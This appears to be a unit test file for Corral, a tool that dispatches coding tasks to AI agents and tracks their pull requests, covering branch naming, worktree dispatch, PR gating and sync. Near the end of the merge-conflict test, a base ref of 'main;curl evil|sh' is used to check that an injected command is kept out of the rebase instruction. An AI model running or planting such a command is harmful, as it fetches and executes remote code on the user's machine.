// Unit tests for Corral's core pieces (worker-free: fakes for the backend).
// Run: npm test

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, rmSync, mkdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { execFileSync } from "node:child_process";
import { Db } from "../db.ts";
import { branchName, dispatchTask, slugify } from "../dispatch.ts";
import type { Config } from "../config.ts";
import { addRepo, isGitRepo, jiraKeyPrefix, scanWorkspaceRepos } from "../repos.ts";
import { prReady, prItemBody, prReviewLabel, syncTaskPr, syncAllPrs, findPr, type PrInfo } from "../pr.ts";
import { CaptureEngine } from "../capture.ts";
import { createHttpServer, type AppState } from "../api.ts";
import type {
  WorkerBackend,
  WorkerElicitation,
  WorkerEvent,
  WorkerStart,
  WorkerSession,
} from "../worker.ts";
import type { Item, Task } from "../types.ts";

function makeTask(over: Partial<Task> = {}): Task {
  const now = Date.now();
  return {
    id: "task-1",
    title: "Add caching",
    prompt: "Add caching",
    repo_path: "/tmp/repo",
    target: "claude",
    target_state: "suggested",
    base_branch: null,
    branch: null,
    worktree_path: null,
    assignee: null,
    jira_key: null,
    jira_url: null,
    jira_parent_key: null,
    pr_url: null,
    pr_meta: null,
    status: "open",
    terminal_address: null,
    exit_code: null,
    created_ms: now,
    updated_ms: now,
    ...over,
  };
}

/** Minimal in-memory WorkerBackend for capture tests. */
function fakeBackend(readText = "agent tail…") {
  const started: WorkerStart[] = [];
  const sent: { address: string; text: string }[] = [];
  const backend: WorkerBackend = {
    name: "fake",
    async start(s: WorkerStart): Promise<WorkerSession> {
      started.push(s);
      return {
        address: "s1",
        task_id: s.taskId,
        name: s.name,
        harness: s.harness,
        status: "working",
        blocked_kind: null,
        state: "live",
        turn: 1,
        cwd: s.git ? `${s.repoPath}-worktrees/${s.git.branch}` : s.repoPath,
        created_ms: Date.now(),
        exit_code: null,
        parent: null,
      };
    },
    list: async () => [],
    get: async () => null,
    read: async () => readText,
    send: async (address, text) => {
      sent.push({ address, text });
    },
    resolveElicitation: async () => undefined,
    kill: async () => undefined,
    history: async () => readText,
    tree: async () => [],
    onEvent: () => ({ stop: () => undefined }),
  };
  return { backend, started, sent };
}

test("slugify produces url-safe names", () => {
  assert.equal(slugify("Add caching layer!"), "add-caching-layer");
  assert.equal(slugify("  Résumé de la conférence  "), "resume-de-la-conference");
  assert.equal(slugify("!!!"), "task");
  assert.ok(slugify("x".repeat(100)).length <= 40);
});

test("branchName keeps whole words and groups ticket tasks under their key", () => {
  assert.equal(
    branchName(makeTask({
      id: "447281f8-a690-4bf9-b3e5-294fdaabdaf0",
      title: "When I check the MR/PR created by corral, the branch name is always badly named.",
      prompt: "When I check the MR/PR created by corral, the branch name is always badly named.",
    })),
    "corral/check-mr-pr-created-branch-447281",
  );
  assert.equal(
    branchName(makeTask({
      title: "QOV-2543 [Custom domains] Organization domains list",
      jira_key: "QOV-2543",
    })),
    "qov-2543/custom-domains-organization-list",
  );
  assert.equal(branchName(makeTask({ title: "PROJ-42 Fix issue", jira_key: "PROJ-42" })), "proj-42/fix-issue");
  assert.equal(branchName(makeTask({ title: "", prompt: "Add a force refresh button on the usage page", id: "abcdef123456" })), "corral/add-force-refresh-button-usage-abcdef");
  // A slug never ends in a cut-off word, even with a long or accented title.
  const long = branchName(makeTask({ title: "Résumé de la conférence — très très long titre avec beaucoup de mots", id: "abcdef123456" }));
  assert.equal(long, "corral/resume-conference-tres-long-titre-abcdef");
  assert.match(long, /^[a-z0-9-]+\/[a-z0-9-]+$/);
});

test("dispatch retries a branch collision and saves the successful branch", async () => {
  const dir = mkdtempSync(join(tmpdir(), "corral-collision-"));
  const db = new Db(join(dir, "test.db"));
  try {
    execFileSync("git", ["init", "-q", dir]);
    const task = makeTask({ repo_path: dir });
    db.insertTask(task);
    const { backend, started } = fakeBackend();
    const start = backend.start.bind(backend);
    let attempts = 0;
    backend.start = async (request) => {
      if (attempts++ < 2) throw new Error(`omnigent POST /v1/sessions -> 400: {"error":{"code":"invalid_input","message":"worktree creation failed: a branch named '${request.git!.branch}' already exists; choose a different branch name"}}`);
      return start(request);
    };
    const result = await dispatchTask(db, { configDir: dir, host: "localhost", port: 4787, token: "" } as Config, backend, task, "codex");
    assert.equal(attempts, 3);
    assert.match(result.branch, /^corral\/add-caching-task-1-[0-9a-f]{8}$/);
    assert.equal(db.getTask(task.id)?.branch, result.branch);
    assert.equal(started[0].git?.branch, result.branch);
  } finally {
    db.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

test("dispatch: worktree starts from the freshly fetched remote default branch", async () => {
  const dir = mkdtempSync(join(tmpdir(), "corral-dispatch-"));
  const git = (cwd: string, ...args: string[]) => execFileSync("git", ["-C", cwd, ...args], { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
  try {
    const remote = join(dir, "remote.git");
    const source = join(dir, "source");
    const clone = join(dir, "clone");
    execFileSync("git", ["init", "--bare", "--initial-branch=main", remote]);
    execFileSync("git", ["clone", remote, source], { stdio: "ignore" });
    git(source, "config", "user.email", "test@example.com");
    git(source, "config", "user.name", "Test");
    git(source, "config", "commit.gpgsign", "false");
    git(source, "commit", "--allow-empty", "-m", "initial");
    git(source, "push", "-u", "origin", "main");
    execFileSync("git", ["clone", remote, clone], { stdio: "ignore" });
    git(source, "commit", "--allow-empty", "-m", "new remote commit");
    git(source, "push");
    const expected = git(source, "rev-parse", "HEAD");
    const db = new Db(join(dir, "test.db"));
    const task = makeTask({ repo_path: clone });
    db.insertTask(task);
    const { backend, started } = fakeBackend();
    const cfg = { configDir: dir, host: "localhost", port: 4787, token: "" } as Config;
    await dispatchTask(db, cfg, backend, task, "codex");
    assert.equal(started[0].project, clone);
    assert.ok(started[0].git?.base);
    assert.equal(git(clone, "rev-parse", started[0].git!.base!), expected);
    assert.notEqual(git(clone, "rev-parse", "HEAD"), expected);
    const explicit = makeTask({ id: "task-2", repo_path: clone, base_branch: "main" });
    db.insertTask(explicit);
    await dispatchTask(db, cfg, backend, explicit, "codex");
    assert.equal(git(clone, "rev-parse", started[1].git!.base!), expected);
    git(clone, "remote", "add", "duplicate", remote);
    git(clone, "config", "remote.duplicate.fetch", "+refs/heads/*:refs/remotes/origin/*");
    const ambiguous = makeTask({ id: "task-4", repo_path: clone });
    db.insertTask(ambiguous);
    await dispatchTask(db, cfg, backend, ambiguous, "codex");
    git(clone, "worktree", "add", "-b", "test-ambiguous", join(dir, "worktree"), started[2].git!.base!);
    assert.equal(git(join(dir, "worktree"), "rev-parse", "HEAD"), expected);
    git(clone, "remote", "set-url", "origin", join(dir, "missing.git"));
    const broken = makeTask({ id: "task-3", repo_path: clone });
    db.insertTask(broken);
    await assert.rejects(dispatchTask(db, cfg, backend, broken, "codex"), /dispatch failed/);
    assert.equal(db.getTask(broken.id)?.status, "open");
    await dispatchTask(db, cfg, backend, broken, "codex", { useWorktree: false });
    assert.equal(started[3].git, null);
    db.close();
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("dispatch: fetches a custom remote branch outside the clone refspec", async () => {
  const dir = mkdtempSync(join(tmpdir(), "corral-branch-"));
  const git = (cwd: string, ...args: string[]) => execFileSync("git", ["-C", cwd, ...args], { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
  const db = new Db(join(dir, "test.db"));
  try {
    const remote = join(dir, "remote.git"), source = join(dir, "source"), clone = join(dir, "clone");
    execFileSync("git", ["init", "--bare", "--initial-branch=main", remote], { stdio: "ignore" });
    execFileSync("git", ["clone", remote, source], { stdio: "ignore" });
    git(source, "config", "user.email", "test@example.com");
    git(source, "config", "user.name", "Test");
    git(source, "config", "commit.gpgsign", "false");
    git(source, "commit", "--allow-empty", "-m", "initial");
    git(source, "push", "origin", "main");
    execFileSync("git", ["clone", "--single-branch", remote, clone], { stdio: "ignore" });
    git(source, "checkout", "-b", "feature/custom");
    git(source, "commit", "--allow-empty", "-m", "custom base");
    git(source, "push", "origin", "feature/custom");
    const expected = git(source, "rev-parse", "HEAD");
    const task = makeTask({ repo_path: clone, base_branch: "feature/custom" });
    db.insertTask(task);
    const { backend, started } = fakeBackend();
    await dispatchTask(db, { configDir: dir, host: "localhost", port: 4787, token: "" } as Config, backend, task, "codex");
    assert.equal(started[0].git?.base, expected);
  } finally {
    db.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

for (const target of ["codex", "claude", "opencode"]) {
  for (const scenario of [
    { name: "title only", title: " Fix missing task context ", prompt: "", expected: "Fix missing task context" },
    { name: "title and details", title: "OPS-123 Fix task context", prompt: " Preserve the full description.\nInclude acceptance criteria. ", expected: "OPS-123 Fix task context\n\nPreserve the full description.\nInclude acceptance criteria." },
    { name: "untitled", title: " ", prompt: " Fix task context ", expected: "Fix task context" },
    { name: "matching title and details", title: "Fix task context", prompt: "Fix task context", expected: "Fix task context" },
  ]) {
    test(`dispatch to ${target}: preserves task context (${scenario.name})`, async () => {
      const dir = mkdtempSync(join(tmpdir(), "corral-dispatch-"));
      const db = new Db(join(dir, "test.db"));
      try {
        execFileSync("git", ["init", "-q", dir], { stdio: "ignore" });
        const task = makeTask({ title: scenario.title, prompt: scenario.prompt, repo_path: dir });
        db.insertTask(task);
        const { backend, started } = fakeBackend();
        const cfg = { configDir: dir, host: "127.0.0.1", port: 4787, token: "t" } as never;

        await dispatchTask(db, cfg, backend, task, target, { useWorktree: false });

        assert.equal(started.length, 1);
        assert.equal(started[0].prompt.split("\n\n---\n")[0], scenario.expected);
        assert.ok(started[0].prompt.length > scenario.expected.length, "workflow conventions are appended");
        assert.equal(started[0].harness, target);
        if (!scenario.title.trim()) assert.equal(started[0].name, null);
        assert.equal(db.getTask(task.id)?.status, "dispatched");
      } finally {
        db.close();
        rmSync(dir, { recursive: true, force: true });
      }
    });
  }
}

test("db: task and item round-trip", () => {
  const dir = mkdtempSync(join(tmpdir(), "corral-test-"));
  try {
    const db = new Db(join(dir, "test.db"));
    const task = makeTask();
    db.insertTask(task);
    assert.equal(db.getTask("task-1")?.title, "Add caching");
    db.updateTask("task-1", { status: "dispatched", branch: "feat", handoff: "did things" });
    assert.equal(db.getTask("task-1")?.status, "dispatched");
    assert.equal(db.getTask("task-1")?.handoff, "did things");
    assert.equal(db.listTasks("dispatched").length, 1);

    const item: Item = {
      id: "item-1",
      kind: "question",
      status: "open",
      title: "needs you",
      summary: "",
      body: "tail",
      context: "",
      options: null,
      ready: 1,
      source_ref: "s9",
      task_id: "task-1",
      structured: 0,
      created_ms: Date.now(),
      updated_ms: Date.now(),
      resolved_ms: null,
      snooze_until_ms: null,
    };
    db.insertItem(item);
    assert.equal(db.openQuestionItemForTerminal("s9")?.id, "item-1");
    db.updateItem("item-1", { status: "resolved", resolved_ms: Date.now() });
    assert.equal(db.openQuestionItemForTerminal("s9"), null);

    db.insertTask(makeTask({ id: "task-2", jira_key: "OPS-1" }));
    assert.equal(db.getTaskByJiraKey("OPS-1")?.id, "task-2");

    db.recordMetric("test.event", "ref", { a: 1 });
    assert.ok(db.metricSummary().some((m) => m.name === "test.event"));
    db.close();
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("repos: registry, scan and jira prefix mapping", () => {
  const dir = mkdtempSync(join(tmpdir(), "corral-repos-"));
  try {
    const root = join(dir, "workspace");
    for (const name of ["alpha", "team/beta"]) {
      const repo = join(root, name);
      mkdirSync(join(root, "team"), { recursive: true });
      execFileSync("git", ["init", "-q", repo], { stdio: "ignore" });
    }
    const notRepo = join(root, "notes");
    mkdirSync(notRepo, { recursive: true });

    const db = new Db(join(dir, "test.db"));
    assert.ok(isGitRepo(join(root, "alpha")));
    assert.ok(!isGitRepo(notRepo));

    const added = scanWorkspaceRepos(db, [root]);
    assert.equal(added.length, 2, "both repos found");
    assert.equal(db.listRepos().length, 2);
    assert.equal(scanWorkspaceRepos(db, [root]).length, 0, "idempotent rescan");

    const alpha = db.getRepoByPath(join(root, "alpha"))!;
    db.updateRepo(alpha.id, { jira_prefix: "ops" });
    assert.equal(db.getRepoByJiraPrefix(jiraKeyPrefix("OPS-123"))?.id, alpha.id, "prefix maps case-insensitively");
    assert.equal(jiraKeyPrefix("QOV-2138"), "QOV");
    assert.equal(jiraKeyPrefix("NOKEY"), "NOKEY");

    addRepo(db, join(root, "alpha"), { source: "scan" });
    assert.equal(db.listRepos().length, 2);
    db.close();
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("pr gate: ready only when threads answered, checks green, mergeable", () => {
  const base: PrInfo = {
    url: "https://example.com/pr/1",
    title: "feat: thing",
    state: "OPEN",
    number: 1,
    description: "Does a thing.",
    additions: 10,
    deletions: 2,
    changed_files: 3,
    mergeable: "MERGEABLE",
    base_ref: "main",
    review_decision: null,
    checks: { total: 2, failed: 0, pending: false },
    threads: [],
  };

  assert.equal(prReady(base).ready, true, "clean PR is ready");

  const withComments = { ...base, threads: [{ id: "t1", author: "copilot", body: "fix this" }] };
  const r1 = prReady(withComments);
  assert.equal(r1.ready, false);
  assert.match(r1.reasons.join(), /1 unresolved review comment/);

  assert.match(prReady({ ...base, checks: { total: 2, failed: 1, pending: false } }).reasons.join(), /1 failing check/);
  assert.match(prReady({ ...base, checks: { total: 2, failed: 0, pending: true } }).reasons.join(), /checks still running/);
  assert.match(prReady({ ...base, mergeable: "CONFLICTING" }).reasons.join(), /merge conflicts/);
  assert.equal(prReady({ ...base, mergeable: "UNKNOWN" }).ready, false);
  assert.equal(prReady({ ...base, mergeable: null }).ready, false);
  assert.equal(prReady({ ...base, state: "MERGED" }).ready, false);

  const body = prItemBody(base);
  assert.match(body, /Does a thing\./);
  assert.match(body, /\+10 \/ -2/);
  assert.match(body, /https:\/\/example\.com\/pr\/1/);

  // Corral's own vocabulary for a ready PR: a human approval is what makes it
  // "ready to merge"; before that (and when approvals are unknown) it is only
  // "ready for review" — the label the inbox shows and Jira follows.
  assert.equal(prReviewLabel(base), "ready for review");
  assert.equal(prReviewLabel({ ...base, human_approvals: null }), "ready for review");
  assert.equal(prReviewLabel({ ...base, human_approvals: [] }), "ready for review");
  assert.equal(prReviewLabel({ ...base, human_approvals: ["alice"] }), "ready to merge");
});

test("capture: elicitation, fallback, auto-resolution, completion handoff", async () => {
  const dir = mkdtempSync(join(tmpdir(), "corral-cap-"));
  try {
    const db = new Db(join(dir, "test.db"));
    db.insertTask(makeTask());
    db.upsertTerminal({
      address: "s9",
      task_id: "task-1",
      name: "corral-test",
      agent: "claude",
      last_status: null,
      last_turn: 0,
      updated_ms: Date.now(),
    });
    const broadcasts: [string, unknown][] = [];
    const { backend } = fakeBackend();
    const engine = new CaptureEngine(db, backend, {
      broadcast: (t: string, d: unknown) => broadcasts.push([t, d]),
    });

    // blocked WITH an elicitation -> structured question item with options
    const elicit: WorkerElicitation = {
      id: "el1",
      kind: "permission",
      prompt: "Allow running tests?",
      choices: ["yes", "no"],
    };
    await engine.handleEvent({
      type: "status",
      address: "s9",
      status: "blocked",
      elicitations: [elicit],
    });
    const item = db.openQuestionItemForTerminal("s9");
    assert.ok(item, "elicitation item created");
    assert.equal(item.structured, 1);
    assert.equal(item.options, JSON.stringify(["yes", "no"]));
    assert.match(item.body, /Allow running tests\?/);

    // a structured report supersedes it
    const structured = await engine.createStructuredQuestion({
      taskId: "task-1",
      terminal: "s9",
      title: "Use Postgres or SQLite?",
      body: "I recommend SQLite.",
      options: ["SQLite", "Postgres", "none"],
    });
    assert.equal(structured.id, item.id, "supersedes the pending item");
    assert.equal(structured.options, JSON.stringify(["SQLite", "Postgres", "none"]));

    // leaving blocked auto-resolves
    await engine.handleEvent({ type: "status", address: "s9", status: "idle" });
    assert.equal(db.openQuestionItemForTerminal("s9"), null, "auto-resolved");

    // completion report: pr item + task done + handoff stored
    const done = await engine.createStructuredQuestion({
      kind: "done",
      taskId: "task-1",
      terminal: "s9",
      title: "PR: add caching",
      body: "Done, tests pass.\n\nPR: https://example.com/pr/1\n\n## Handoff\nBranch is clean; keep tests green.",
    });
    assert.equal(done.kind, "pr");
    const task = db.getTask("task-1")!;
    assert.equal(task.status, "done", "task marked done by the completion report");
    assert.match(task.handoff ?? "", /keep tests green/);

    // fallback path (no elicitation): raw tail
    await engine.handleEvent({ type: "status", address: "s9", status: "blocked", elicitations: [] });
    const fallback = db.openQuestionItemForTerminal("s9");
    assert.ok(fallback);
    assert.equal(fallback.structured, 0);
    assert.match(fallback.body, /agent tail…/);
    assert.ok(broadcasts.some(([t]) => t === "item.created"));
    db.close();
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("pr sync: persists the last checks/thread snapshot without touching updated_ms", async () => {
  const dir = mkdtempSync(join(tmpdir(), "corral-prsnapshot-"));
  try {
    const db = new Db(join(dir, "test.db"));
    const old = 1_700_000_000_000;
    db.insertTask(makeTask({ branch: "feat-x", status: "dispatched", repo_path: "/tmp/repo", updated_ms: old, pr_url: "https://example.com/pr/7" }));
    const hub = { broadcast: () => undefined };
    let current: PrInfo = {
      url: "https://example.com/pr/7",
      title: "feat: x",
      state: "OPEN",
      number: 7,
      description: "x",
      additions: 1,
      deletions: 1,
      changed_files: 1,
      mergeable: "CONFLICTING",
      base_ref: "main",
      review_decision: "CHANGES_REQUESTED",
      checks: { total: 3, failed: 1, pending: false },
      threads: [{ id: "th1", author: "bot", body: "fix" }, { id: "th2", author: "bot", body: "also" }],
      threads_known: true,
    };

    await syncTaskPr(db, hub, db.getTask("task-1")!, { finder: () => current });
    let task = db.getTask("task-1")!;
    let snapshot = JSON.parse(task.pr_meta ?? "{}").pr;
    assert.equal(snapshot.checks.failed, 1);
    assert.deepEqual(snapshot.threads, { unresolved: 2, ids: ["th1", "th2"], known: true });
    assert.deepEqual(snapshot.reasons, ["2 unresolved review comments", "1 failing check", "merge conflicts", "changes requested"]);
    assert.equal(snapshot.ready, false);
    assert.equal(task.updated_ms, old, "persisting a snapshot is not task activity");

    current = { ...current, mergeable: "MERGEABLE", review_decision: null, checks: { total: 3, failed: 0, pending: false }, threads: [] };
    await syncTaskPr(db, hub, db.getTask("task-1")!, { finder: () => current });
    task = db.getTask("task-1")!;
    snapshot = JSON.parse(task.pr_meta ?? "{}").pr;
    assert.equal(snapshot.ready, true);
    assert.deepEqual(snapshot.threads.ids, []);
    assert.equal(task.updated_ms, old, "a later snapshot still does not touch updated_ms");
    db.close();
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("pr sync: merge completes the task and archives its items and session", async () => {
  const dir = mkdtempSync(join(tmpdir(), "corral-prsync-"));
  try {
    const db = new Db(join(dir, "test.db"));
    db.insertTask(makeTask({ title: "", branch: "feat-x", status: "dispatched", terminal_address: "s1", repo_path: "/tmp/repo" }));
    const { backend } = fakeBackend();
    const archived: string[] = [];
    backend.archive = async (address) => { archived.push(address); };
    const hub = { broadcast: () => undefined };

    let current: PrInfo = {
      url: "https://example.com/pr/7",
      title: "feat: x",
      state: "OPEN",
      number: 7,
      description: "x",
      additions: 1,
      deletions: 1,
      changed_files: 1,
      mergeable: "MERGEABLE",
      base_ref: "main",
      review_decision: null,
      checks: { total: 1, failed: 0, pending: false },
      threads: [],
    };
    const finder = () => current;
    await syncTaskPr(db, hub, makeTask({ branch: "feat-x", status: "dispatched", repo_path: "/tmp/repo", id: "task-1" }), { finder });
    let item = db.listItems({ kind: "pr" })[0];
    assert.equal(item.ready, 1);
    assert.equal(item.title, "PR ready for review: feat: x");

    current = { ...current, human_approvals: ["alice"] };
    await syncTaskPr(db, hub, db.getTask("task-1")!, { finder });
    item = db.listItems({ kind: "pr" })[0];
    assert.equal(item.summary, "ready to merge");
    assert.equal(item.title, "PR ready to merge: feat: x");

    current = { ...current, threads: [{ id: "t1", author: "bot", body: "fix" }] };
    await syncTaskPr(db, hub, db.getTask("task-1")!, { finder });
    item = db.listItems({ kind: "pr" })[0];
    assert.equal(item.ready, 0);
    assert.equal(item.title, "PR needs work: feat: x");
    assert.match(item.summary, /1 unresolved review comment/);

    current = { ...current, state: "MERGED", threads: [] };
    await syncTaskPr(db, hub, db.getTask("task-1")!, { finder, backend });
    assert.deepEqual(archived, ["s1"]);
    item = db.listItems({ kind: "pr" })[0];
    assert.equal(item.status, "archived", "merged PR items are archived");
    assert.equal(item.title, "PR merged: feat: x");
    assert.equal(db.getTask("task-1")?.status, "done", "merged PR completes the task");
    db.close();
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("pr sync: merge conflicts are pushed to the agent once per episode", async () => {
  const dir = mkdtempSync(join(tmpdir(), "corral-prconflict-"));
  try {
    const db = new Db(join(dir, "test.db"));
    db.insertTask(makeTask({ branch: "feat-x", status: "dispatched", terminal_address: "s1" }));
    const hub = { broadcast: () => undefined };
    const { backend, sent, started } = fakeBackend();
    backend.get = async (address) => ({
      address,
      task_id: "task-1",
      name: "x",
      harness: "claude",
      status: "idle",
      blocked_kind: null,
      state: "live",
      turn: 1,
      cwd: "/tmp/repo",
      created_ms: Date.now(),
      exit_code: null,
      parent: null,
    });
    const cfg = { agents: { claude: {} }, configDir: dir, host: "127.0.0.1", port: 4787, token: "t" } as never;
    let current: PrInfo = {
      url: "https://example.com/pr/7",
      title: "feat: x",
      state: "OPEN",
      number: 7,
      description: "x",
      additions: 1,
      deletions: 1,
      changed_files: 1,
      mergeable: "CONFLICTING",
      base_ref: "develop",
      review_decision: null,
      checks: { total: 0, failed: 0, pending: false },
      threads: [],
    };
    const finder = () => current;
    const settle = () => new Promise((r) => setTimeout(r, 10));
    const sync = async () => {
      await syncTaskPr(db, hub, db.getTask("task-1")!, { finder, backend, cfg });
      await settle();
    };

    await sync();
    assert.equal(sent.length, 1);
    assert.match(sent[0].text, /^PR merge conflicts/);
    assert.match(sent[0].text, /git rebase origin\/develop/);
    assert.match(db.listItems({ kind: "pr" })[0].summary, /merge conflicts/);
    assert.equal(db.listItems({ kind: "pr" })[0].handling, 1, "the agent owns the item while it rebases");

    await sync(); // same episode: not pushed again
    assert.equal(sent.length, 1);

    current = { ...current, threads: [{ id: "t1", author: "bot", body: "fix" }] };
    await sync(); // new comments only — conflict not repeated
    assert.equal(sent.length, 2);
    assert.match(sent[1].text, /^PR review comments/);
    assert.doesNotMatch(sent[1].text, /merge conflicts/);

    current = { ...current, mergeable: "UNKNOWN", threads: [] };
    await sync(); // recalculating: episode not over
    current = { ...current, mergeable: "CONFLICTING" };
    await sync();
    assert.equal(sent.length, 2);

    current = { ...current, mergeable: "MERGEABLE", threads: [] };
    await sync(); // resolved: episode cleared
    current = { ...current, mergeable: "CONFLICTING" };
    await sync(); // new episode: pushed again
    assert.equal(sent.length, 3);
    assert.match(sent[2].text, /^PR merge conflicts/);

    current = { ...current, mergeable: "MERGEABLE" };
    await sync(); // the gate passes: the human owns the item again
    assert.equal(db.listItems({ kind: "pr" })[0].handling, 0);
    assert.equal(db.listItems({ kind: "pr" })[0].ready, 1);
    current = { ...current, mergeable: "CONFLICTING", base_ref: "main;curl evil|sh" };
    await sync(); // unsafe base ref never reaches the command
    assert.match(sent[3].text, /git rebase origin\/main\n/);
    assert.doesNotMatch(sent[3].text, /curl/);
    assert.equal(started.length, 0);
    db.close();
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("pr sync: failed delivery is retried; respawn keeps harness and moves source_ref", async () => {
  const dir = mkdtempSync(join(tmpdir(), "corral-prretry-"));
  try {
    const db = new Db(join(dir, "test.db"));
    db.insertTask(makeTask({ branch: "feat-x", status: "dispatched", target: "junie", terminal_address: "old" }));
    const hub = { broadcast: () => undefined };
    const { backend, started } = fakeBackend();
    const realStart = backend.start;
    let down = true;
    backend.start = async (s) => {
      if (down) throw new Error("backend down");
      return realStart(s);
    };
    const cfg = { agents: { claude: {} }, configDir: dir, host: "127.0.0.1", port: 4787, token: "t" } as never;
    const pr: PrInfo = {
      url: "https://example.com/pr/7",
      title: "feat: x",
      state: "OPEN",
      number: 7,
      description: "x",
      additions: 1,
      deletions: 1,
      changed_files: 1,
      mergeable: "CONFLICTING",
      base_ref: "main",
      review_decision: null,
      checks: { total: 0, failed: 0, pending: false },
      threads: [],
    };
    const settle = () => new Promise((r) => setTimeout(r, 10));
    const sync = async () => {
      await syncTaskPr(db, hub, db.getTask("task-1")!, { finder: () => pr, backend, cfg });
      await settle();
    };

    await sync(); // respawn fails: not marked delivered
    assert.equal(started.length, 0);
    assert.equal(JSON.parse(db.getTask("task-1")!.pr_meta ?? "{}").conflict, undefined);

    down = false;
    await sync(); // retried
    assert.equal(started.length, 1);
    assert.equal(started[0].harness, "junie");
    assert.equal(started[0].project, "/tmp/repo");
    assert.equal(db.getTask("task-1")!.terminal_address, "s1");

    await sync(); // next sync points the PR item at the new session
    assert.equal(db.listItems({ kind: "pr" })[0].source_ref, "s1");
    db.close();
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("pr sync: concurrent syncs deliver once", async () => {
  const dir = mkdtempSync(join(tmpdir(), "corral-prconc-"));
  try {
    const db = new Db(join(dir, "test.db"));
    db.insertTask(makeTask({ branch: "feat-x", status: "dispatched" }));
    const hub = { broadcast: () => undefined };
    const { backend, started } = fakeBackend();
    const cfg = { agents: { claude: {} }, configDir: dir, host: "127.0.0.1", port: 4787, token: "t" } as never;
    const pr: PrInfo = {
      url: "https://example.com/pr/7",
      title: "feat: x",
      state: "OPEN",
      number: 7,
      description: "x",
      additions: 1,
      deletions: 1,
      changed_files: 1,
      mergeable: "CONFLICTING",
      base_ref: "main",
      review_decision: null,
      checks: { total: 0, failed: 0, pending: false },
      threads: [{ id: "t1", author: "bot", body: "fix" }],
    };
    const opts = { finder: () => pr, backend, cfg };
    await Promise.all([
      syncTaskPr(db, hub, db.getTask("task-1")!, opts),
      syncTaskPr(db, hub, db.getTask("task-1")!, opts),
    ]);
    await new Promise((r) => setTimeout(r, 10));
    assert.equal(started.length, 1);
    db.close();
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});


test("GitHub inbox approval reflects each human's latest review", async () => {
  const dir = mkdtempSync(join(tmpdir(), "corral-gh-approvals-"));
  const originalPath = process.env.PATH;
  try {
    writeFileSync(join(dir, "git"), "#!/bin/sh\necho https://github.com/example/repo.git\n", { mode: 0o755 });
    writeFileSync(join(dir, "gh"), `#!/bin/sh
case "$*" in
  "pr view"*) echo '{"url":"https://github.com/example/repo/pull/7","title":"PR","state":"OPEN","number":7}' ;;
  *"/reviews"*) echo '[[{"state":"APPROVED","user":{"login":"alice","type":"User"}},{"state":"APPROVED","user":{"login":"bob","type":"User"}},{"state":"CHANGES_REQUESTED","user":{"login":"bob","type":"User"}},{"state":"APPROVED","user":{"login":"bot","type":"Bot"}}]]' ;;
  *) echo '{"data":{"repository":{"pullRequest":{"reviewThreads":{"nodes":[]}}}}}' ;;
esac
`, { mode: 0o755 });
    process.env.PATH = `${dir}:${originalPath}`;
    const pr = await findPr(dir, "feature");
    assert.ok(pr);
    assert.deepEqual(pr.human_approvals, ["alice"]);
    assert.match(prItemBody(pr), /Human approvals \| alice/);
  } finally {
    process.env.PATH = originalPath;
    rmSync(dir, { recursive: true, force: true });
  }
});

test("GitLab inbox approval lists humans and excludes bots", async () => {
  const dir = mkdtempSync(join(tmpdir(), "corral-approvals-"));
  const originalPath = process.env.PATH;
  try {
    writeFileSync(join(dir, "gh"), "#!/bin/sh\nexit 1\n", { mode: 0o755 });
    writeFileSync(join(dir, "glab"), `#!/bin/sh
case "$*" in
  "mr list"*) echo '[{"iid":7,"state":"opened","web_url":"https://gitlab.example/mr/7"}]' ;;
  *'/approvals') echo '{"approved_by":[{"user":{"username":"alice","bot":false}},{"user":{"username":"GitLabDuo","bot":true}}]}' ;;
  *'/changes') echo '{"changes":[]}' ;;
  *'/discussions?per_page=100') echo '[]' ;;
  *) echo '{"has_conflicts":false}' ;;
esac
`, { mode: 0o755 });
    process.env.PATH = `${dir}:${originalPath}`;
    const pr = await findPr(dir, "feature");
    assert.ok(pr);
    assert.match(prItemBody(pr), /Human approvals \| alice/);
    assert.doesNotMatch(prItemBody(pr), /GitLabDuo/);
  } finally {
    process.env.PATH = originalPath;
    rmSync(dir, { recursive: true, force: true });
  }
});

test("GitLab MR uses detailed mergeability when list omits conflicts", async () => {
  const dir = mkdtempSync(join(tmpdir(), "corral-glab-"));
  const originalPath = process.env.PATH;
  try {
    writeFileSync(join(dir, "gh"), "#!/bin/sh\nexit 1\n", { mode: 0o755 });
    writeFileSync(join(dir, "glab"), `#!/bin/sh
case "$*" in
  "mr list"*) echo '[{"iid":7,"state":"opened","web_url":"https://gitlab.example/mr/7"}]' ;;
  *'/changes') echo '{"changes":[]}' ;;
  *'/discussions?per_page=100') echo '[]' ;;
  *) echo '{"has_conflicts":false,"head_pipeline":{"status":"success"}}' ;;
esac
`, { mode: 0o755 });
    process.env.PATH = `${dir}:${originalPath}`;
    const pr = await findPr(dir, "feature");
    assert.ok(pr);
    assert.equal(prReady(pr).ready, true);
  } finally {
    process.env.PATH = originalPath;
    rmSync(dir, { recursive: true, force: true });
  }
});


test("PR sync endpoint responds before a slow lookup and completes it in the background", async () => {
  const dir = mkdtempSync(join(tmpdir(), "corral-pr-background-"));
  const originalPath = process.env.PATH;
  const db = new Db(join(dir, "test.db"));
  writeFileSync(join(dir, "gh"), `#!/bin/sh
sleep 1
echo '{"url":"https://github.com/example/repo/pull/15","title":"fix","state":"MERGED","number":15}'
`, { mode: 0o755 });
  process.env.PATH = `${dir}:${originalPath}`;
  db.insertTask(makeTask({ branch: "feature", status: "dispatched", repo_path: dir, pr_url: "https://github.com/example/repo/pull/15" }));
  const hub = { broadcast: () => undefined };
  const { backend } = fakeBackend();
  const server = createHttpServer({ db, backend, hub, cfg: { token: "test" } } as unknown as AppState);
